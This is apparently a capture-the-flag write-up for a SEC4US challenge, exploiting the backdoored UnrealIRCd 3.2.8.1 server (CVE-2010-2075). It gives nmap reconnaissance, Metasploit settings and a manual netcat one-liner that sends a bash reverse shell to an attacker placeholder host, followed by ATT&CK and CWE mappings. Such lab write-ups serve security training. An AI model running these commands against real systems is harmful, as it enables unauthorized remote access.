# Maq106: Servidor IRC

Writeup for the **Servidor IRC** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 106

---

## Overview

An IRC server running a backdoored version of UnrealIRCd. The infamous CVE-2010-2075 allows remote code execution through a crafted connection string.

## Reconnaissance

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
```

Look for port 6667 (IRC) or 6697 (IRC over TLS). The banner may reveal `Unreal3.2.8.1`, which is the backdoored version.

```bash
nmap -sV -p 6667 --script irc-info [TARGET_IP]
```

## Exploitation

The UnrealIRCd 3.2.8.1 backdoor responds to a specific trigger string `AB;` followed by a system command.

**Using Metasploit:**

```bash
msfconsole -q
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS [TARGET_IP]
set PAYLOAD cmd/unix/reverse
set LHOST [ATTACKER_IP]
run
```

**Manual exploitation:**

```bash
echo "AB; bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1" | nc [TARGET_IP] 6667
```

Set up a listener before the manual approach:

```bash
nc -lvnp 4444
```

## Post-Exploitation

Once a shell is obtained, enumerate the filesystem for the flag and check the running user privileges.

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Exploit Public-Facing Application | T1190 |
| Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Supply Chain Compromise: Compromise Software Supply Chain | T1195.002 |

### CWE

- **CWE-912:** Hidden Functionality (software backdoor)
- **CWE-506:** Embedded Malicious Code

---

A backdoor sewn into the source code itself is the ultimate supply-chain compromise: users trust the software, and the software betrays them silently on every connection.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
